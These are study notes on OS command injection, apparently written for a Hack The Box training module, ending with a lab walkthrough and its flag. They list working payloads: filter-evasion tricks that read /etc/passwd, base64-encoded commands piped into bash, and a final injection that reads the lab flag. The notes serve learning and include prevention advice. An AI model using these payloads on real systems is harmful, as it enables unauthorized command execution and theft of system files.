# Command Injection — Study Notes

> **HTB / CPTS & CWES** — Cheat sheet and notes for Command Injection techniques and filter evasion.

---

## Table of Contents

- [Types of Injection](#types-of-injection)
- [Injection Operators](#injection-operators)
- [Detection & Exploitation](#detection--exploitation)
- [Filter Evasion](#filter-evasion)
  - [Bypassing Space Filters](#bypassing-space-filters)
  - [Bypassing Blacklisted Characters](#bypassing-blacklisted-characters)
  - [Bypassing Blacklisted Commands](#bypassing-blacklisted-commands)
  - [Advanced Obfuscation](#advanced-obfuscation)
- [Obfuscation Tools](#obfuscation-tools)
- [Prevention](#prevention)
- [Skills Assessment — Walkthrough](#skills-assessment--walkthrough)

---

## Types of Injection

It is critical to distinguish between injection types — they operate at different levels of the stack.

| Type | Description |
|---|---|
| **OS Command Injection** | Reaches the OS shell via system calls (e.g., through PHP's `system()`) |
| **Code Injection** | Executes code within the language runtime, does **not** reach the OS |
| **SQL Injection** | Manipulates database queries |
| **HTML Injection** | Injects markup into rendered page content |
| **LDAP Injection** | Manipulates directory service queries |
| **XPath Injection** | Manipulates XML path queries |
| **Header Injection** | Injects HTTP headers via unsanitized input |

> ⚠️ **Note:** OS Command Injection can occur through languages like PHP when system calls are used. Code Injection stays confined to the language itself.

---

## Injection Operators

| Operator | Character | URL-Encoded | Executed Command |
|---|---|---|---|
| Semicolon | `;` | `%3b` | Both |
| New Line | `\n` | `%0a` | Both |
| Background | `&` | `%26` | Both (second output shown first) |
| Pipe | `\|` | `%7c` | Both (only second output shown) |
| AND | `&&` | `%26%26` | Both (only if first succeeds) |
| OR | `\|\|` | `%7c%7c` | Second (only if first fails) |
| Sub-Shell | ` `` ` | `%60%60` | Both (**Linux only**) |
| Sub-Shell | `$()` | `%24%28%29` | Both (**Linux only**) |

---

## Detection & Exploitation

### Front-End Validation Bypass

Front-end validation can always be bypassed by intercepting the HTTP request directly.

**Workflow:**
1. Intercept the request with **Burp Suite**
2. Modify the parameter value directly in the Repeater
3. Send — server-side validation is what actually matters

### Injection Type Reference (by Context)

| Injection Type | Operators / Characters |
|---|---|
| SQL Injection | `'` `;` `--` `/* */` |
| Command Injection | `;` `&&` |
| LDAP Injection | `*` `(` `)` `&` `\|` |
| XPath Injection | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection | `;` `&` `\|` |
| Code Injection | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^` |
| Directory Traversal | `../` `..\` `%00` |
| Header Injection | `\n` `\r\n` `\t` `%0d` `%0a` `%09` |
| Shellcode Injection | `\x` `\u` `%u` `%n` |

---

## Filter Evasion

### Bypassing Space Filters

When the space character is filtered, use these alternatives:

| Bypass Technique | Example Payload |
|---|---|
| **Tab** (`%09`) | `ip=127.0.0.1%0A%09ls%09-la` |
| **`$IFS`** | `ip=127.0.0.1%0a${IFS}ls${IFS}-la` |
| **Bash Brace Expansion** | `ip=127.0.0.1%0a{ls,-la}` |

---

### Bypassing Blacklisted Characters

Use shell variable slicing to produce special characters without typing them.

#### Linux

```bash
${PATH:0:1}        # → /
${LS_COLORS:10:1}  # → ;
```

#### Windows CMD

```cmd
%HOMEPATH:~6,-11%  # → \  (assuming 11-char username like htb-student)
```

#### Windows PowerShell

```powershell
$env:HOMEPATH[0]   # → \
```

#### Character Shifting

Produce filtered characters using ASCII range shifting:

```bash
echo $(tr '!-}' '"-~'<<<[)   # → \
echo $(tr '!-}' '"-~'<<<:)   # → ;
```

---

### Bypassing Blacklisted Commands

Insert inert characters **inside** the command name to break pattern matching while keeping the command valid:

#### Linux

```bash
# Insert $@ inside command name
c$@at /etc/passwd

# Insert backslash
ca\t /etc/passwd

# Use quotes
c'a't /etc/passwd
c"a"t /etc/passwd
```

#### Windows

```cmd
wh^o^ami
```

---

### Advanced Obfuscation

#### Case Manipulation (Linux only — lowercase conversion)

```bash
# Using tr
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

# Using bash parameter expansion
$(a="WhOaMi";printf %s "${a,,}")
```

#### Command Reversal

```bash
# Linux
echo 'whoami' | rev
$(rev<<<'imaohw')
```

```powershell
# Windows PowerShell
iex "$('imaohw'[-1..-20] -join '')"
```

#### Base64 Encoding

```bash
# Step 1 — encode the command locally
echo -n 'cat /etc/passwd | grep 33' | base64
# → Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

# Step 2 — execute on the target
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

---

## Obfuscation Tools

| Platform | Tool |
|---|---|
| Linux | [**Bashfuscator**](https://github.com/Bashfuscator/Bashfuscator) |
| Windows | **DOSfuscator** |

---

## Prevention

| Layer | Recommendation |
|---|---|
| **Input handling** | Always sanitize and validate on the **server side** |
| **Privileges** | Apply the **principle of least privilege** to the web server process |
| **Attack surface** | Disable all features and functions that are not required |
| **Scope** | Minimize what the server can reach (network segmentation, no internet access if possible) |
| **Language** | Use parameterized APIs instead of shell invocations where possible |

---

## Skills Assessment — Walkthrough

### Target

A file management web app with the following endpoints:

```
/index.php?to=
/index.php?to=&view=<filename>
/index.php?to=&view=<filename>&quickView=1
/index.php?to=&from=<filename>&finish=1
/index.php?to=&dl=<filename>
/index.php?to=&from=<filename>&finish=1&move=1
```

### Vulnerable Parameter

The `to` parameter in the **move** request (`finish=1&move=1`). The `from` parameter is heavily filtered (blocks `\n`, `;`, `/`), but the `to` parameter accepts URL-encoded `;` (`%3B`).

### Key Observations

- Direct `/` is blocked → use `${PATH:0:1}` instead
- Spaces are blocked → use `%09` (tab) instead
- `cat` is blacklisted → break it with `$@`: `c$@at`
- Semi-colon is blocked in `from` but **not** in `to` (`%3B` works)

### Final Payload (injected into the `to` parameter)

```
%3Bc$@at%09${PATH:0:1}flag.txt
```

**Decoded:**

```bash
; cat	/flag.txt
#  ↑     ↑  ↑
# %3B  %09  ${PATH:0:1} → /
```

### Alternative — Full Base64 Payload

```
${LS_COLORS:10:1}${IFS}bash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDEg)
```

### Flag

```
HTB{c0mm4nd3r_1nj3c70r}
```

---

*Notes based on HTB CPTS/CWES — Command Injections module.*
